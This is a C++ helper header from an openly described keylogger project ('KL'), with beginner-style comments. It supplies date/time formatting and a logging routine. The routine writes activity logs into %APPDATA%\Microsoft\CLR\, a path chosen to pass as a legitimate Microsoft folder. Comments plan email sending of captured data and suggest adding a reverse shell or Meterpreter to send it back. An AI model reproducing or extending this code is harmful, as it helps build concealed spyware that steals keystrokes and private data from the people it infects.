
#ifndef HELPER_H //need to be a unique name
#define HELPER_H

#include <ctime> //retrieve time for mail sending triggers etc
#include <string> //using it for getting various types to string to fill out our log files
#include <sstream> //use this to convert strings and do some operations
#include <fstream> //need for file stream
//own namespace to group functions and stuff
//using namespace std; //not a good practice, because once we construct our own namespace, it might have a custom namespace with string etc

namespace Helper
{
    //create a template
    template <class T> std::string ToString (const T &e); //custom function prototype initialize here, we will create the body. all functions prototype must be create first, convert everything to a string for our log file
    //using & cause we wont copy any variables, we just use the pointer?

    //for e.g. ToString(5); //converting the integer to a string later on in the body of the function

    struct DateTime
    {
        DateTime()
        {
            time_t ms; //ms = milliseconds time_t is a library included in the C library
            time (&ms); //takes system time and pass it into &ms variable (using ctime library)

            struct tm *info = localtime(&ms); //* = pointer to a struct tm a type from ctime library. pointers  are variables that contain the address in the computer's memory / RAM of another variable referred to as pointT, access a pointer and in doing so, you will access the variables to which it points to (points to localtime(&ms) value).

            D = info->tm_mday; //this represents (D = day) info point, to indirectly access the attribute tm_mday from the struct tm.
            m = info->tm_mon + 1; //m = month as it starts for 0 we + 1 the month(mon) variable in tm
            y = 1900 + info->tm_year; //y = year, 1900 is a reference year, loclatime function = time passed from the day this starts.

            M = info->tm_min; //M = minutes
            H = info->tm_hour; //H = hours
            S = info->tm_sec; //S = seconds
        } //constructor for this struct does not take a parameter but creates a DateTime with the current local time on the machine

        //2nd construct need it next time to create own custom time
        DateTime(int D, int m, int y, int H, int M, int S) : D(D), m(m), y(y), H(H), M(M), S(S) {} //empty body as we already initialize it with :
        //3rd constructor to only take it date but time all 0
        DateTime(int D, int m, int y) : D(D), m(m), y(y), H(0), M(0), S(0) {} //empty body as we already initialize it with :
        //method to get the current date time
        DateTime Now() const //return datetime const only READ will not change anything within the class
        {
            return DateTime(); //returns the constructor returning the current datetime
        }

        time_t msOut;
        int D,m,y,H,M,S; //specifying all the variables

        //formating our date, readable to date format
        std::string GetDateString() const
        {
            return  std::string( D < 10 ? "0" : "") + ToString(D) + //adding a 0 to day if D is less than 10
                    std::string( m < 10 ? ".0" : ".") + ToString(m) + "." +//adding a 0 to month if m is less than 10
                    ToString(y);
        }

        std::string GetTimeString(const std::string &sep = ":" ) const//idea was name files based on the date, cannot use colon in name files in windows, we need to take those out later
        {
            return  std::string ( H < 10 ? "0" : "") + ToString(H) + sep + //similar to whats happening above formating
                    std::string ( M < 10 ? "0" : "") + ToString(M) + sep + //similar to whats happening above formating
                    std::string ( S < 10 ? "0" : "") + ToString(S); //similar to whats happening above formating
        } //returns HH:MM:SS

        std::string GetDateTimeString (const std::string &sep = ":") const
        {
            return  GetDateString() + " " + GetTimeString(sep);
        }

    }; //helper struct to use in order to represent Date and Time;
    //difference between struct and class, class are just STRUCTS in FUNCTION generally
    //structs everything by default is public
    //class are generally by default private
    template <class T>
    std::string ToString(const T &e)
    {
        std::ostringstream s; //variable s of type outputstringstream placing stuff in it//be able to receive anything that supports the insertion operator
        s << e; //function will take anything, only be able to pass a type to this function that supports the insertion operator << //if a variable e of type T this will not compile
        return s.str();
    }

    //records errors and behaviour of KL
    //for example if KL attempts to send an email, and error, if fails, it will record to send an email and reason? Permissions, etc, etc
    //we can add a reverse shell to send the data back (or use meterpreter's one)

    void WriteAppLog( const std::string &s)
    {
        std::string appdata_dir(getenv("APPDATA")); //this will get the environment variable - path - which contains the APPDATA directory
        std::string full = appdata_dir + "\\Microsoft\\CLR\\";

        std::ofstream file(full+"AppLog.txt", std::ios::app); //only appending //std::ios::app stands for append
        file  << "\n" << "[" << Helper::DateTime().GetDateTimeString() << "]" <<  //dumping the data into file
        "\n" << s << std::endl; //std::endl == new line and flush
        file.close();//need to be closed
    }

    void WriteAppLog( const std::string &s, const bool &nn)
    {
        std::string appdata_dir(getenv("APPDATA")); //this will get the environment variable - path - which contains the APPDATA directory
        std::string full = appdata_dir + "\\Microsoft\\CLR\\";

        std::ofstream file(full+"AppLog.txt", std::ios::app); //only appending //std::ios::app stands for append
        file << "[" << Helper::DateTime().GetDateTimeString() << "] " //dumping the data into file
        << s << std::endl; //std::endl == new line and flush
        file.close();//need to be closed
    }

}

#endif // HELPER_H
